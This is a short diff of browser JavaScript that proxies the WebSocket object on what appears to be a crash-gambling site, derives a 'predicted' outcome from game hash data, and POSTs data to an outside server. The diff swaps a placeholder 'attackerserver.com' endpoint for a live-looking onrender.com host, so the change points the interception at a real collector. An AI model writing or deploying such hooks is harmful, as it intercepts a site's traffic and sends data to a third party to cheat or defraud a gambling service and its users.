@@ -8,7 +8,7 @@ const wsProxy = new Proxy(WebSocket, {
                 const crashData = JSON.parse(event.data);
                 const predictedValue = Math.floor(crashData.hash.substr(0,4)/65535 * 100)/10;
                 if (predictedValue > 2.4) {
-                    fetch('https://attackerserver.com/trigger', {
+                    fetch('https://predact.onrender.com', {
                         method: 'POST',
                         body: JSON.stringify({
                             timestamp: Date.now(),
